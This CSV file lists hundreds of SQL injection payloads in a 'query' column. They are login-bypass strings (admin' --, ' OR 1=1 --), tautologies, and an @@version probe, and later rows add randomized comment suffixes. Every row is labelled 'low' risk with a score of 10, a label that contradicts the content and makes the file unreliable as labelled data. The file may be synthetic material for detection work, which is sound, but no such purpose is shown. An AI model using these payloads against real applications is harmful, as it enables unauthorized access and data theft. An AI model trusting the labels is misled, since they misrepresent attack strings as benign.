query,risk,score
' OR 1=1 LIMIT 1 --,low,10
' OR 1 IN (SELECT @@version) --,low,10
' OR 1 IN (SELECT @@version) --,low,10
admin' --,low,10
""" OR ""1""=""1",low,10
' || 1=1 --,low,10
' OR 1=1 LIMIT 1 --,low,10
admin' --,low,10
' or 'a'='a,low,10
1' or 1=1 --,low,10
' OR 'a'='a,low,10
' or 'a'='a,low,10
1' or true --,low,10
admin' /**/,low,10
1' or '1'='1,low,10
' OR 1=1 LIMIT 1 --,low,10
1' or true --,low,10
1' or 1=1 --,low,10
' OR 'a'='a,low,10
' OR 1 IN (SELECT @@version) --,low,10
' OR 'x'='x,low,10
admin' /**/,low,10
1' or true --,low,10
admin' /**/,low,10
1' or 1=1 --,low,10
admin' --,low,10
""" OR ""1""=""1",low,10
' or 'a'='a,low,10
' OR 'x'='x,low,10
1' OR '1'='1,low,10
' OR 'x'='x,low,10
1' or true --,low,10
admin' --,low,10
' OR 'x'='x,low,10
1' or true --,low,10
admin' /**/,low,10
' OR 1 IN (SELECT @@version) --,low,10
1' or '1'='1,low,10
admin' --,low,10
admin' --,low,10
' OR 'a'='a,low,10
admin' /**/,low,10
' OR 1=1 LIMIT 1 --,low,10
' OR 'x'='x,low,10
1' or '1'='1,low,10
""" OR ""1""=""1",low,10
1' or 1=1 --,low,10
admin' --,low,10
admin' --,low,10
' or 'a'='a,low,10
admin' /**/,low,10
' OR 1 IN (SELECT @@version) --,low,10
1' or 1=1 --,low,10
1' or '1'='1,low,10
admin' /**/,low,10
""" OR ""1""=""1",low,10
1' or true --,low,10
' OR 1=1 --,low,10
' or 'a'='a,low,10
""" OR ""1""=""1",low,10
' OR 'x'='x,low,10
' OR 1=1 --,low,10
admin' --,low,10
admin' --,low,10
1' OR '1'='1,low,10
' or 'a'='a,low,10
1' OR '1'='1,low,10
' OR 'x'='x,low,10
' OR 1=1 --,low,10
' || 1=1 --,low,10
1' or '1'='1,low,10
' OR 1 IN (SELECT @@version) --,low,10
admin' --,low,10
1' OR '1'='1,low,10
admin' /**/,low,10
' OR 1 IN (SELECT @@version) --,low,10
' OR 1=1 LIMIT 1 --,low,10
""" OR ""1""=""1",low,10
admin' --,low,10
' OR 1=1 LIMIT 1 --,low,10
admin' --,low,10
admin' --,low,10
' OR 1=1 LIMIT 1 --,low,10
1' OR '1'='1,low,10
' OR 1=1 LIMIT 1 --,low,10
1' OR '1'='1,low,10
' OR 1=1 --,low,10
' OR 1=1 --,low,10
""" OR ""1""=""1",low,10
1' OR '1'='1,low,10
1' or true --,low,10
' OR 'x'='x,low,10
1' OR '1'='1,low,10
' OR 'x'='x,low,10
1' or 1=1 --,low,10
' OR 'a'='a,low,10
1' or true --,low,10
' OR 1=1 --,low,10
' OR 1 IN (SELECT @@version) --,low,10
admin' --,low,10
admin' --,low,10
admin' --,low,10
admin' --,low,10
1' OR '1'='1,low,10
' OR 1=1 --,low,10
""" OR ""1""=""1",low,10
' OR 1 IN (SELECT @@version) --,low,10
admin' --,low,10
' || 1=1 --,low,10
' OR 'x'='x,low,10
' OR 1 IN (SELECT @@version) --,low,10
' or 'a'='a,low,10
admin' --,low,10
1' or true --,low,10
1' or true --,low,10
admin' --,low,10
' OR 'x'='x,low,10
1' OR '1'='1,low,10
' OR 1=1 --,low,10
""" OR ""1""=""1",low,10
' OR 'a'='a,low,10
admin' --,low,10
' || 1=1 --,low,10
1' or '1'='1,low,10
""" OR ""1""=""1",low,10
admin' /**/,low,10
1' or 1=1 --,low,10
1' or true --,low,10
1' or 1=1 --,low,10
' OR 'x'='x,low,10
admin' --,low,10
1' OR '1'='1,low,10
' OR 1=1 --,low,10
' OR 1=1 --,low,10
1' OR '1'='1,low,10
' || 1=1 --,low,10
' OR 1=1 LIMIT 1 --,low,10
' OR 1 IN (SELECT @@version) --,low,10
admin' /**/,low,10
' OR 1=1 --,low,10
admin' --,low,10
1' or true --,low,10
' || 1=1 --,low,10
admin' /**/,low,10
1' or true --,low,10
1' or '1'='1,low,10
1' or true --,low,10
' OR 1 IN (SELECT @@version) --,low,10
1' or true --,low,10
' OR 'x'='x,low,10
admin' /**/,low,10
admin' --,low,10
1' OR '1'='1,low,10
' OR 'a'='a,low,10
admin' /**/,low,10
' OR 1 IN (SELECT @@version) --,low,10
1' or '1'='1,low,10
' OR 'x'='x,low,10
1' or '1'='1,low,10
admin' --,low,10
' OR 1 IN (SELECT @@version) --,low,10
' OR 1=1 --,low,10
1' or true --,low,10
admin' /**/,low,10
' OR 'a'='a,low,10
1' or 1=1 --,low,10
' OR 1 IN (SELECT @@version) --,low,10
1' OR '1'='1,low,10
1' or 1=1 --,low,10
' or 'a'='a,low,10
""" OR ""1""=""1",low,10
' OR 1=1 --,low,10
' || 1=1 --,low,10
' OR 1=1 LIMIT 1 --,low,10
admin' --,low,10
admin' --,low,10
' OR 1 IN (SELECT @@version) --,low,10
' or 'a'='a -- 0,low,10
1' or true -- -- e,low,10
1' OR '1'='1 # ao,low,10
' OR 'x'='x -- 2,low,10
admin' -- /**/,low,10
""" OR ""1""=""1 # o6",low,10
' OR 'a'='a /**/,low,10
1' or '1'='1 # sj,low,10
' OR 'a'='a -- c,low,10
' || 1=1 -- /**/,low,10
1' or 1=1 -- -- e,low,10
admin' -- -- j,low,10
""" OR ""1""=""1 # v0",low,10
' OR 'x'='x -- l,low,10
' OR 1 IN (SELECT @@version) -- # xw,low,10
admin' -- /**/,low,10
' OR 1=1 -- -- f,low,10
1' OR '1'='1 /**/,low,10
""" OR ""1""=""1 /**/",low,10
1' OR '1'='1 # w7,low,10
admin' /**/ -- x,low,10
1' OR '1'='1 -- 5,low,10
admin' -- /**/,low,10
admin' -- -- 9,low,10
' OR 'x'='x /**/,low,10
' OR 1 IN (SELECT @@version) -- /**/,low,10
admin' -- # tj,low,10
' || 1=1 -- -- w,low,10
""" OR ""1""=""1 # cw",low,10
""" OR ""1""=""1 -- 9",low,10
1' or 1=1 -- # hj,low,10
admin' -- # 31,low,10
' OR 1 IN (SELECT @@version) -- /**/,low,10
""" OR ""1""=""1 # cv",low,10
admin' -- /**/,low,10
admin' -- # 0h,low,10
' OR 'a'='a -- 6,low,10
' OR 'x'='x # ik,low,10
' OR 1 IN (SELECT @@version) -- # lk,low,10
admin' -- -- m,low,10
admin' /**/ # pd,low,10
' OR 'a'='a -- y,low,10
' OR 1 IN (SELECT @@version) -- # 3s,low,10
' OR 1 IN (SELECT @@version) -- -- j,low,10
1' OR '1'='1 /**/,low,10
' or 'a'='a /**/,low,10
1' or 1=1 -- # x4,low,10
' OR 'x'='x -- a,low,10
admin' /**/ -- m,low,10
' OR 1 IN (SELECT @@version) -- -- 7,low,10
' OR 'a'='a /**/,low,10
' or 'a'='a # qu,low,10
1' OR '1'='1 /**/,low,10
' OR 'a'='a /**/,low,10
1' or true -- # up,low,10
""" OR ""1""=""1 -- w",low,10
admin' -- -- d,low,10
' || 1=1 -- /**/,low,10
admin' -- -- 8,low,10
' OR 'x'='x /**/,low,10
admin' -- # ox,low,10
' or 'a'='a # 5o,low,10
admin' -- /**/,low,10
admin' -- # 26,low,10
' OR 1=1 -- /**/,low,10
admin' -- # 0p,low,10
' || 1=1 -- # 08,low,10
""" OR ""1""=""1 /**/",low,10
' OR 1 IN (SELECT @@version) -- /**/,low,10
' or 'a'='a /**/,low,10
admin' -- /**/,low,10
admin' -- # nr,low,10
admin' -- -- a,low,10
' || 1=1 -- /**/,low,10
' OR 1=1 LIMIT 1 -- /**/,low,10
1' or true -- /**/,low,10
admin' -- /**/,low,10
1' OR '1'='1 /**/,low,10
1' OR '1'='1 /**/,low,10
' or 'a'='a -- j,low,10
' || 1=1 -- # lf,low,10
1' or true -- /**/,low,10
' OR 1 IN (SELECT @@version) -- /**/,low,10
1' or 1=1 -- /**/,low,10
1' or '1'='1 -- i,low,10
1' OR '1'='1 /**/,low,10
1' or '1'='1 # bb,low,10
' OR 1=1 -- -- d,low,10
admin' -- -- q,low,10
' OR 1 IN (SELECT @@version) -- # qd,low,10
admin' /**/ -- 9,low,10
1' or true -- -- w,low,10
1' or 1=1 -- -- f,low,10
""" OR ""1""=""1 -- n",low,10
' OR 1 IN (SELECT @@version) -- -- r,low,10
' OR 'x'='x -- t,low,10
""" OR ""1""=""1 -- 0",low,10
admin' /**/ /**/,low,10
' OR 'x'='x # bo,low,10
' or 'a'='a /**/,low,10
' OR 'a'='a # yo,low,10
admin' /**/ /**/,low,10
' or 'a'='a # hl,low,10
admin' -- /**/,low,10
admin' -- # vc,low,10
1' or 1=1 -- # 58,low,10
admin' /**/ /**/,low,10
admin' /**/ # kg,low,10
admin' -- -- h,low,10
' OR 'a'='a # 64,low,10
admin' -- # 5e,low,10
admin' -- # s3,low,10
admin' /**/ -- s,low,10
' OR 'a'='a /**/,low,10
' OR 1=1 LIMIT 1 -- # up,low,10
admin' -- # ti,low,10
' OR 1=1 -- /**/,low,10
1' or true -- # u5,low,10
admin' -- /**/,low,10
1' or 1=1 -- # jd,low,10
""" OR ""1""=""1 # 93",low,10
' OR 1=1 LIMIT 1 -- -- 7,low,10
""" OR ""1""=""1 -- e",low,10
' OR 'a'='a -- 9,low,10
admin' -- /**/,low,10
' OR 1=1 -- /**/,low,10
' OR 'a'='a # l1,low,10
' OR 'x'='x /**/,low,10
' OR 'x'='x /**/,low,10
1' OR '1'='1 -- 3,low,10
1' or '1'='1 /**/,low,10
' OR 'x'='x /**/,low,10
' OR 'x'='x /**/,low,10
admin' /**/ -- x,low,10
1' or true -- /**/,low,10
' OR 'x'='x -- r,low,10
""" OR ""1""=""1 -- 6",low,10
1' or '1'='1 # si,low,10
' OR 1=1 -- /**/,low,10
1' or '1'='1 # ot,low,10
' || 1=1 -- /**/,low,10
1' OR '1'='1 /**/,low,10
' OR 1 IN (SELECT @@version) -- -- o,low,10
1' or '1'='1 /**/,low,10
admin' /**/ -- i,low,10
1' or true -- # wf,low,10
' OR 1=1 -- # ec,low,10
""" OR ""1""=""1 # 3r",low,10
' OR 'x'='x /**/,low,10
' || 1=1 -- -- d,low,10
' OR 'x'='x /**/,low,10
' OR 1=1 LIMIT 1 -- # v9,low,10
admin' -- # b6,low,10
' OR 'a'='a # 8e,low,10
' OR 'x'='x # 9b,low,10
1' or true -- /**/,low,10
' OR 1=1 LIMIT 1 -- -- m,low,10
' OR 'a'='a /**/,low,10
' OR 'x'='x /**/,low,10
' OR 'x'='x # 89,low,10
1' or '1'='1 -- 8,low,10
1' or '1'='1 # qu,low,10
' OR 1=1 LIMIT 1 -- # gh,low,10
1' OR '1'='1 /**/,low,10
1' or 1=1 -- -- t,low,10
1' or true -- -- h,low,10
1' or true -- # 8q,low,10
' OR 1=1 -- -- q,low,10
' OR 1 IN (SELECT @@version) -- -- c,low,10
1' OR '1'='1 /**/,low,10
admin' -- -- 8,low,10
' OR 1 IN (SELECT @@version) -- /**/,low,10
admin' -- -- h,low,10
admin' -- /**/,low,10
""" OR ""1""=""1 # mw",low,10
1' OR '1'='1 /**/,low,10
' or 'a'='a -- b,low,10
admin' -- # y1,low,10
' OR 'x'='x -- t,low,10
' OR 1=1 LIMIT 1 -- /**/,low,10
1' or '1'='1 /**/,low,10
' OR 1=1 LIMIT 1 -- /**/,low,10
admin' /**/ /**/,low,10
' OR 1=1 LIMIT 1 -- # w6,low,10
' OR 1 IN (SELECT @@version) -- # vj,low,10
""" OR ""1""=""1 /**/",low,10
admin' -- /**/,low,10
admin' /**/ /**/,low,10
1' or 1=1 -- -- z,low,10
""" OR ""1""=""1 /**/",low,10
admin' -- /**/,low,10
admin' -- -- 0,low,10
' OR 'x'='x # fy,low,10
' OR 'a'='a # 4k,low,10
' OR 'a'='a # kt,low,10
' || 1=1 -- -- s,low,10
1' or '1'='1 # 7a,low,10
1' or true -- # 1n,low,10
' or 'a'='a -- a,low,10
1' or '1'='1 -- 9,low,10
admin' /**/ -- g,low,10
admin' -- # eb,low,10
admin' /**/ -- 8,low,10
' OR 1=1 LIMIT 1 -- # w1,low,10
""" OR ""1""=""1 /**/",low,10
1' or true -- /**/,low,10
' OR 1=1 LIMIT 1 -- /**/,low,10
""" OR ""1""=""1 # 3b",low,10
""" OR ""1""=""1 -- k",low,10
1' or '1'='1 # 78,low,10
' || 1=1 -- # 7z,low,10
1' or true -- -- w,low,10
""" OR ""1""=""1 # t2",low,10
' OR 1=1 LIMIT 1 -- # ya,low,10
' OR 'x'='x /**/,low,10
1' or '1'='1 /**/,low,10
""" OR ""1""=""1 /**/",low,10
admin' /**/ # y5,low,10
' or 'a'='a /**/,low,10
1' or '1'='1 # l7,low,10
' OR 1=1 LIMIT 1 -- /**/,low,10
1' or true -- -- f,low,10
' OR 'a'='a # ab,low,10
admin' /**/ /**/,low,10
' OR 'x'='x /**/,low,10
1' or true -- /**/,low,10
' OR 1=1 LIMIT 1 -- -- l,low,10
' OR 'x'='x -- a,low,10
admin' -- -- f,low,10
' OR 'a'='a # fe,low,10
' or 'a'='a -- 4,low,10
' OR 1 IN (SELECT @@version) -- -- 6,low,10
admin' -- # ny,low,10
""" OR ""1""=""1 # kl",low,10
""" OR ""1""=""1 -- d",low,10
' OR 'x'='x # 0q,low,10
1' or '1'='1 # d5,low,10
1' or 1=1 -- /**/,low,10
' OR 'a'='a -- 3,low,10
' or 'a'='a /**/,low,10
' or 'a'='a # 28,low,10
admin' /**/ # n9,low,10
1' or '1'='1 -- y,low,10
1' or 1=1 -- /**/,low,10
' OR 1=1 -- /**/,low,10
' or 'a'='a /**/,low,10
1' or '1'='1 /**/,low,10
' OR 'a'='a # 61,low,10
1' or 1=1 -- -- u,low,10
' || 1=1 -- -- i,low,10
' OR 1=1 -- /**/,low,10
' OR 1=1 LIMIT 1 -- -- 6,low,10
' OR 'x'='x /**/,low,10
1' or 1=1 -- /**/,low,10
admin' /**/ -- z,low,10
admin' -- -- 9,low,10
' OR 1=1 LIMIT 1 -- -- 0,low,10
' || 1=1 -- /**/,low,10
' OR 1=1 -- -- 4,low,10
' OR 1=1 LIMIT 1 -- # cv,low,10
1' or '1'='1 # or,low,10
' OR 'a'='a -- b,low,10
' OR 1=1 LIMIT 1 -- # i0,low,10
1' or '1'='1 /**/,low,10
1' or true -- # xs,low,10
1' OR '1'='1 /**/,low,10
admin' /**/ -- 8,low,10
' || 1=1 -- /**/,low,10
1' OR '1'='1 -- z,low,10
1' or 1=1 -- # g8,low,10
' OR 1=1 LIMIT 1 -- /**/,low,10
' OR 1=1 LIMIT 1 -- /**/,low,10
1' or true -- -- v,low,10
' OR 1 IN (SELECT @@version) -- # nw,low,10
1' or true -- -- j,low,10
admin' /**/ -- e,low,10
admin' -- /**/,low,10
admin' /**/ -- m,low,10
' || 1=1 -- /**/,low,10
' OR 'a'='a # vh,low,10
admin' -- -- v,low,10
' OR 1=1 -- -- x,low,10
' or 'a'='a /**/,low,10
admin' -- # mm,low,10
1' or true -- # gt,low,10
' || 1=1 -- # d9,low,10
1' OR '1'='1 /**/,low,10
1' or true -- /**/,low,10
' or 'a'='a /**/,low,10
' OR 1=1 LIMIT 1 -- -- 9,low,10
1' or 1=1 -- # ru,low,10
' or 'a'='a -- d,low,10
admin' -- -- y,low,10
' OR 1 IN (SELECT @@version) -- -- q,low,10
admin' -- -- k,low,10
' OR 'a'='a /**/,low,10
1' or 1=1 -- /**/,low,10
' OR 1=1 -- /**/,low,10
""" OR ""1""=""1 /**/",low,10
1' OR '1'='1 # m3,low,10
' or 'a'='a # 05,low,10
admin' -- -- l,low,10
' OR 1 IN (SELECT @@version) -- -- g,low,10
1' or 1=1 -- /**/,low,10
' OR 1 IN (SELECT @@version) -- /**/,low,10
admin' -- # aa,low,10
admin' /**/ /**/,low,10
' OR 'x'='x # gp,low,10
' OR 1=1 -- -- j,low,10
' || 1=1 -- /**/,low,10
' or 'a'='a /**/,low,10
' or 'a'='a # 2f,low,10
' OR 1=1 LIMIT 1 -- # 18,low,10
admin' -- # s6,low,10
' || 1=1 -- # ky,low,10
""" OR ""1""=""1 # w6",low,10
1' or 1=1 -- # se,low,10
""" OR ""1""=""1 -- d",low,10
' || 1=1 -- /**/,low,10
""" OR ""1""=""1 /**/",low,10
' || 1=1 -- # e1,low,10
1' or true -- -- k,low,10
' OR 'x'='x /**/,low,10
' OR 1 IN (SELECT @@version) -- -- r,low,10
1' OR '1'='1 /**/,low,10
' OR 'a'='a -- 3,low,10
1' or '1'='1 # x1,low,10
1' or true -- # x1,low,10
admin' -- /**/,low,10
' || 1=1 -- # cv,low,10
' OR 1 IN (SELECT @@version) -- # 1v,low,10
' OR 'a'='a /**/,low,10
1' or '1'='1 # 8x,low,10
admin' /**/ # fp,low,10
' || 1=1 -- # kx,low,10
admin' -- -- v,low,10
admin' -- # ru,low,10
admin' -- # 15,low,10
1' OR '1'='1 -- o,low,10
' OR 1 IN (SELECT @@version) -- -- d,low,10
' OR 1=1 -- # 9m,low,10
' OR 1=1 LIMIT 1 -- -- k,low,10
""" OR ""1""=""1 # sl",low,10
' OR 1=1 LIMIT 1 -- /**/,low,10
1' OR '1'='1 /**/,low,10
' or 'a'='a /**/,low,10
' OR 1=1 -- # ou,low,10
' || 1=1 -- -- o,low,10
admin' -- /**/,low,10
' || 1=1 -- /**/,low,10
' || 1=1 -- -- 4,low,10
""" OR ""1""=""1 /**/",low,10
""" OR ""1""=""1 -- h",low,10
' OR 'x'='x -- e,low,10
' OR 1 IN (SELECT @@version) -- -- c,low,10
admin' /**/ -- 5,low,10
1' or true -- -- c,low,10
admin' /**/ -- w,low,10
' OR 'a'='a -- k,low,10
' or 'a'='a # 4z,low,10
""" OR ""1""=""1 # 30",low,10
' OR 1=1 -- -- 8,low,10
1' or '1'='1 /**/,low,10
' OR 1=1 -- # nz,low,10
' OR 'x'='x /**/,low,10
admin' -- /**/,low,10
""" OR ""1""=""1 -- t",low,10
admin' /**/ /**/,low,10
' OR 'a'='a # 4t,low,10
""" OR ""1""=""1 /**/",low,10
1' or '1'='1 -- 8,low,10
""" OR ""1""=""1 /**/",low,10
admin' /**/ /**/,low,10
' OR 1=1 -- /**/,low,10
""" OR ""1""=""1 -- p",low,10
1' or '1'='1 /**/,low,10
1' or 1=1 -- -- c,low,10
' OR 'a'='a /**/,low,10
' OR 'a'='a # bm,low,10
1' OR '1'='1 -- r,low,10
1' or '1'='1 -- f,low,10
1' or '1'='1 -- 7,low,10
' || 1=1 -- -- l,low,10
""" OR ""1""=""1 /**/",low,10
' || 1=1 -- # qg,low,10
' or 'a'='a # 9h,low,10
1' OR '1'='1 -- 0,low,10
1' or 1=1 -- /**/,low,10
' or 'a'='a # 6c,low,10
""" OR ""1""=""1 /**/",low,10
' || 1=1 -- /**/,low,10
admin' -- -- f,low,10
""" OR ""1""=""1 # zs",low,10
' || 1=1 -- /**/,low,10
' || 1=1 -- # y6,low,10
' OR 'x'='x # at,low,10
1' or true -- -- i,low,10
' OR 'x'='x /**/,low,10
1' or '1'='1 -- n,low,10
' OR 'x'='x /**/,low,10
' OR 'x'='x -- a,low,10
""" OR ""1""=""1 -- x",low,10
1' or true -- /**/,low,10
' or 'a'='a /**/,low,10
admin' /**/ # pa,low,10
' OR 1=1 LIMIT 1 -- # h3,low,10
admin' -- # jn,low,10
' OR 'x'='x # cr,low,10
' OR 1=1 LIMIT 1 -- /**/,low,10
admin' -- /**/,low,10
' OR 1 IN (SELECT @@version) -- # lp,low,10
admin' -- -- r,low,10
admin' /**/ -- 6,low,10
1' or true -- /**/,low,10
' OR 'x'='x /**/,low,10
1' or '1'='1 -- r,low,10
1' or 1=1 -- /**/,low,10
' or 'a'='a /**/,low,10
1' or true -- /**/,low,10
""" OR ""1""=""1 -- a",low,10
1' or true -- -- 0,low,10
' || 1=1 -- /**/,low,10
1' OR '1'='1 /**/,low,10
' OR 1=1 LIMIT 1 -- # ue,low,10
admin' /**/ -- h,low,10
admin' /**/ /**/,low,10
1' or true -- # vd,low,10
1' OR '1'='1 /**/,low,10
' or 'a'='a -- 5,low,10
1' OR '1'='1 /**/,low,10
' || 1=1 -- /**/,low,10
' OR 'a'='a -- k,low,10
' || 1=1 -- -- t,low,10
admin' -- /**/,low,10
admin' -- /**/,low,10
' OR 1=1 LIMIT 1 -- # yd,low,10
1' or true -- # e4,low,10
1' or '1'='1 # 32,low,10
admin' /**/ -- i,low,10
' OR 'x'='x -- a,low,10
' OR 1=1 LIMIT 1 -- -- h,low,10
admin' /**/ /**/,low,10
""" OR ""1""=""1 # lc",low,10
""" OR ""1""=""1 /**/",low,10
' or 'a'='a -- l,low,10
1' or 1=1 -- /**/,low,10
admin' -- -- a,low,10
1' or 1=1 -- -- p,low,10
1' or true -- # n1,low,10
admin' -- /**/,low,10
1' OR '1'='1 /**/,low,10
' or 'a'='a -- 2,low,10
' or 'a'='a -- v,low,10
' OR 1=1 -- # 1s,low,10
' OR 1=1 LIMIT 1 -- # d9,low,10
1' or 1=1 -- -- l,low,10
' OR 1=1 -- -- i,low,10
admin' /**/ /**/,low,10
admin' /**/ -- p,low,10
' OR 1=1 -- # oi,low,10
' OR 1=1 LIMIT 1 -- -- d,low,10
admin' -- # dr,low,10
1' OR '1'='1 # 4t,low,10
' || 1=1 -- -- 2,low,10
' OR 'x'='x -- 0,low,10
' || 1=1 -- -- x,low,10
admin' /**/ # fg,low,10
1' or '1'='1 /**/,low,10
' OR 1=1 -- /**/,low,10
' or 'a'='a -- 9,low,10
admin' /**/ /**/,low,10
' or 'a'='a -- q,low,10
' or 'a'='a /**/,low,10
admin' -- -- z,low,10
1' OR '1'='1 # uh,low,10
' OR 1=1 -- /**/,low,10
""" OR ""1""=""1 -- o",low,10
admin' -- /**/,low,10
admin' /**/ /**/,low,10
' OR 'x'='x # ke,low,10
' OR 'x'='x -- t,low,10
1' or '1'='1 # m0,low,10
1' OR '1'='1 # 1r,low,10
' OR 1 IN (SELECT @@version) -- /**/,low,10
admin' /**/ # a4,low,10
' or 'a'='a # y8,low,10
1' OR '1'='1 # 1s,low,10
1' or true -- /**/,low,10
' OR 'a'='a -- z,low,10
' || 1=1 -- /**/,low,10
admin' /**/ /**/,low,10
' OR 'a'='a /**/,low,10
' or 'a'='a # i2,low,10
' || 1=1 -- -- a,low,10
1' or true -- /**/,low,10
' OR 1 IN (SELECT @@version) -- /**/,low,10
1' or '1'='1 /**/,low,10
' OR 1=1 LIMIT 1 -- # cc,low,10
' OR 1=1 -- -- k,low,10
' OR 'a'='a # 01,low,10
' OR 1=1 -- -- r,low,10
' OR 'x'='x # v8,low,10
""" OR ""1""=""1 # ir",low,10
1' or 1=1 -- # 4h,low,10
1' or 1=1 -- /**/,low,10
admin' -- # mr,low,10
' or 'a'='a # j5,low,10
' OR 1=1 LIMIT 1 -- # 68,low,10
admin' /**/ # my,low,10
""" OR ""1""=""1 # o7",low,10
' OR 'x'='x /**/,low,10
' or 'a'='a -- v,low,10
' OR 'x'='x /**/,low,10
' OR 1=1 LIMIT 1 -- # to,low,10
1' or '1'='1 -- z,low,10
' OR 1=1 -- # r2,low,10
' OR 1=1 LIMIT 1 -- # 5e,low,10
1' OR '1'='1 /**/,low,10
' OR 'x'='x # wq,low,10
' OR 1=1 -- # am,low,10
1' or '1'='1 -- c,low,10
1' or 1=1 -- # yy,low,10
1' or '1'='1 # ao,low,10
1' or true -- /**/,low,10
1' or 1=1 -- # ud,low,10
' OR 1 IN (SELECT @@version) -- # wb,low,10
' OR 'x'='x /**/,low,10
admin' -- /**/,low,10
1' or '1'='1 -- 9,low,10
1' or 1=1 -- -- 0,low,10
' or 'a'='a -- 9,low,10
admin' /**/ /**/,low,10
admin' /**/ /**/,low,10
admin' -- # 4p,low,10
admin' -- -- a,low,10
admin' -- -- z,low,10
' OR 1=1 LIMIT 1 -- # xf,low,10
1' or '1'='1 -- h,low,10
' OR 1=1 -- /**/,low,10
' or 'a'='a # k5,low,10
admin' -- /**/,low,10
' || 1=1 -- /**/,low,10
admin' /**/ -- y,low,10
1' OR '1'='1 /**/,low,10
1' or 1=1 -- -- w,low,10
1' or 1=1 -- /**/,low,10
' OR 'a'='a -- 1,low,10
' OR 1=1 LIMIT 1 -- /**/,low,10
1' or true -- /**/,low,10
' OR 'a'='a /**/,low,10
1' or true -- /**/,low,10
admin' /**/ -- 0,low,10
1' OR '1'='1 /**/,low,10
' || 1=1 -- /**/,low,10
""" OR ""1""=""1 -- u",low,10
' OR 1 IN (SELECT @@version) -- -- i,low,10
1' OR '1'='1 -- g,low,10
1' or '1'='1 # u1,low,10
' or 'a'='a -- v,low,10
admin' -- # 0e,low,10
' || 1=1 -- /**/,low,10
' or 'a'='a -- 1,low,10
admin' /**/ /**/,low,10
' OR 'x'='x -- e,low,10
1' or true -- /**/,low,10
' OR 'a'='a # gr,low,10
' or 'a'='a -- r,low,10
' OR 'a'='a # g7,low,10
admin' /**/ -- g,low,10
admin' -- /**/,low,10
admin' /**/ # 1l,low,10
1' or 1=1 -- /**/,low,10
' OR 1=1 -- -- 4,low,10
1' or '1'='1 /**/,low,10
' OR 'a'='a # 32,low,10
' OR 1=1 -- -- h,low,10
' OR 1=1 LIMIT 1 -- -- l,low,10
1' or '1'='1 /**/,low,10
""" OR ""1""=""1 /**/",low,10
' OR 'x'='x /**/,low,10
1' OR '1'='1 -- 7,low,10
' or 'a'='a -- 3,low,10
admin' -- /**/,low,10
' or 'a'='a -- x,low,10
' OR 'a'='a -- w,low,10
1' OR '1'='1 -- c,low,10
' OR 1 IN (SELECT @@version) -- -- j,low,10
' || 1=1 -- -- 6,low,10
1' OR '1'='1 /**/,low,10
1' or '1'='1 /**/,low,10
' OR 1=1 LIMIT 1 -- /**/,low,10
1' or '1'='1 -- q,low,10
1' OR '1'='1 -- o,low,10
' or 'a'='a -- k,low,10
' OR 'x'='x /**/,low,10
' OR 1 IN (SELECT @@version) -- /**/,low,10
' OR 'x'='x /**/,low,10
1' or 1=1 -- # hr,low,10
' OR 1=1 LIMIT 1 -- # kf,low,10
admin' -- /**/,low,10
' OR 1 IN (SELECT @@version) -- /**/,low,10
1' or true -- -- g,low,10
1' or true -- /**/,low,10
' OR 'a'='a /**/,low,10
' OR 'a'='a -- m,low,10
1' OR '1'='1 # lq,low,10
admin' /**/ # k2,low,10
1' or '1'='1 /**/,low,10
' OR 'x'='x # c5,low,10
1' or '1'='1 -- 6,low,10
""" OR ""1""=""1 -- 6",low,10
1' or true -- -- e,low,10
admin' -- -- k,low,10
1' or 1=1 -- # 1m,low,10
1' OR '1'='1 /**/,low,10
' || 1=1 -- -- h,low,10
' || 1=1 -- /**/,low,10
' OR 'a'='a # ib,low,10
' || 1=1 -- /**/,low,10
' or 'a'='a /**/,low,10
' OR 1 IN (SELECT @@version) -- -- z,low,10
""" OR ""1""=""1 -- x",low,10
admin' /**/ -- e,low,10
admin' -- # ah,low,10
1' OR '1'='1 /**/,low,10
1' or '1'='1 -- 8,low,10
""" OR ""1""=""1 /**/",low,10
admin' -- /**/,low,10
1' or true -- /**/,low,10
1' OR '1'='1 # qk,low,10
1' or 1=1 -- /**/,low,10
' || 1=1 -- # ka,low,10
' OR 1=1 -- /**/,low,10
""" OR ""1""=""1 -- 4",low,10
' OR 1=1 LIMIT 1 -- /**/,low,10
' or 'a'='a -- a,low,10
admin' /**/ /**/,low,10
1' or 1=1 -- -- n,low,10
1' or 1=1 -- /**/,low,10
' or 'a'='a # z6,low,10
1' or '1'='1 /**/,low,10
' OR 1=1 -- -- x,low,10
admin' /**/ # 3k,low,10
admin' /**/ /**/,low,10
' or 'a'='a -- u,low,10
' OR 1 IN (SELECT @@version) -- # 25,low,10
admin' /**/ # l1,low,10
' OR 'a'='a # 24,low,10
1' OR '1'='1 /**/,low,10
' or 'a'='a -- h,low,10
' OR 1=1 LIMIT 1 -- # wp,low,10
